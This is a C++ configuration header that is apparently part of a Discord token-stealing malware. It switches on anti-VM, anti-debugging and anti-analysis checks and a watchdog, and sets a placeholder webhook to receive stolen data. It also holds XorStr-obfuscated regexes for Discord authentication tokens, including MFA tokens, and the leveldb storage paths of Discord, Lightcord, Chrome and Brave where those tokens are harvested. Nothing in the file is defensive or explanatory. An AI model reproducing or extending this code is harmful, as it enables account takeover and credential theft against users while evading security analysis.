#pragma once
#include "includes.h"

namespace Config {
	
	bool check_virtual_machine = true;
	bool check_debugging = true;
	bool check_analyzing = true;
	bool watch_dog = true;
	
	const char* webhook = XorStr("your webhook here");
	
	std::regex token_nonmfa(XorStr(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
	std::regex token_mfa(XorStr(R"(mfa\.[\w-]{84})"));
  //TODO: fix this
	const char* LIGHTCORD	=	XorStr("\\Lightcord\\Local Storage\\leveldb");
	const char* DISCORD		=	XorStr("\\Discord\\Local Storage\\leveldb");
	const char* DISCORDPTB	=	XorStr("\\discordptb\\Local Storage\\leveldb");
	const char* CANARY		=	XorStr("\\discordcanary\\Local Storage\\leveldb");

	const char* CHROME		=	XorStr("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
	const char* BRAVE		=	XorStr("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

	std::vector<std::string> installs {
		LIGHTCORD,
		DISCORD,
		DISCORDPTB,
		CANARY,
		CHROME,
		BRAVE
	};

}
